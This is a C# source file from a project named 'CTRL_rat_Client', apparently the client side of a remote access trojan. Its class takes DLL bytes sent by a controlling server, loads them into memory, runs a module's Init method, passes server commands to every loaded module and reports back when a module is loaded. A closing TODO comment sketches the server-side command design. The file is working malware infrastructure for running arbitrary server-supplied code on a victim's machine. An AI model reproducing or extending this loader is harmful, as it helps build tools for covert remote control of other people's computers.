using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CTRL_rat_Client
{
    class Dll_loader_and_handler
    {
        Dictionary<string, Assembly> Assembly_holder = new Dictionary<string, Assembly>();
        Dictionary<string, object> Activator_holder = new Dictionary<string, object>();
        public string GetAssembly(byte[] dll) 
        {
            var g = sha256_hash(dll);
            if (!Assembly_holder.ContainsKey(g)) 
            {
                Assembly_holder[g] = Assembly.Load(dll);
                //do code to get the bytes by sending a request and waiting for result, prob with id attached along.
                //then set the assembly_holder[name] to the now loaded dll
            }
            return g;
        }
        public object GetActivator(string dll, string classpath)
        {
            var j = Assembly_holder[dll];
            if (!Activator_holder.ContainsKey(dll))
            {
                Activator_holder[dll] = Activator.CreateInstance(j.GetType(classpath));
                //do code to get the bytes by sending a request and waiting for result, prob with id attached along.
                //then set the assembly_holder[name] to the now loaded dll
            }
            return Activator_holder[dll];
        }
        public string sha256_hash(byte[] value)
        {
            using (SHA256 hash = SHA256Managed.Create())
            {
                return String.Concat(hash.ComputeHash(value).Select(item => item.ToString("x2")));
            }
        }
        public byte[] objecttobyte(object[] e)
        {
            int len = 0;
            byte[] built = new byte[e.Length];
            foreach (int i in e)
            {
                built[len] = Convert.ToByte(i);
                len++;
            }
            return built;
        }
        public void relay_message_to_all_dlls(Dictionary<object, object> message, node client) 
        {
            foreach (string key in Activator_holder.Keys.ToList())
            {
                if (!Activator_holder.ContainsKey(key)) return;
                var o = Activator_holder[key];
                var p = o.GetType().GetMethod("OnMessage", BindingFlags.Instance | BindingFlags.Public);
                Console.WriteLine((string)message["op"] + "   yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy");
                p.Invoke(o, new object[] { client,message });
            }
            //code to loop through all loaded dlls and deleiver message
        }
        public void relay_onclose_to_all_dlls(node client) 
        {
            foreach (string key in Activator_holder.Keys.ToList()) 
            {
                if (!Activator_holder.ContainsKey(key)) return;
                var o = Activator_holder[key];
                var p = o.GetType().GetMethod("OnClose", BindingFlags.Instance | BindingFlags.Public);
                p.Invoke(o, new object[] { client });
            }
        
        }
        public void OnClose(node client) 
        {
            new Thread(() => relay_onclose_to_all_dlls(client)).Start();
        }
        public void OnMessage(Dictionary<object, object> response, node client)
        {
            var opcode = (string)response["op"];
            if (opcode == "load_dll")
            {

                var j = response["data"] as object[];
                byte[] bytes = objecttobyte(j);
                var o = GetActivator(GetAssembly(bytes), "CTRL_module.Main");
                var p = o.GetType().GetMethod("Init", BindingFlags.Instance | BindingFlags.Public);
                p.Invoke(o, new object[] { client });
                Console.WriteLine("eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeloaded");
                Dictionary<object, object> payload = new Dictionary<object, object>();
                payload["op"] = "dll_loaded";
                payload["id"] = (string)response["id"];
                client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(payload)));
            }
            else 
            {
                new Thread(()=> relay_message_to_all_dlls(response, client)).Start();
            }
        }
    }
}
//TODO:
/*
On the server create some sort of holder of the commands, and when u wanna run a command, the opcode of the command is the same as the holder, and if a dll is required , the client will request for the dll using the opcode as the dll it wants plus an id.\
the server will respond with the dll and the id.


there should also be something to tell the server that the dll has been loaded so it can continue with what ever it want to call

revision:

instead of of calling the dll over and over again, the dll will just be loaded and will wait for the message, etc, pls remeber, keywords: threading, something else.
 */
